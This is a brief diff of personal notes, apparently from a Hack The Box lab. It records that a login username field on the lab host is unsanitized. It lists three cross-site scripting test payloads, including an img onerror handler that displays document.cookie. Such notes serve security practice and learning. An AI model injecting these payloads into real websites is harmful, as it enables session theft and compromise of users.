@@ -1,0 +1,10 @@
+Username input in docker.hackthebox.eu:30373/administrat/index.php seems to not be sanatized
+
+using this 
+<script>alert("123");</script>
+
+this is rendered
+"> <img src="" x onerror=alert(document.cookie)>
+
+this too
+"> <img src="" x onerror=alert(location.pathname)>
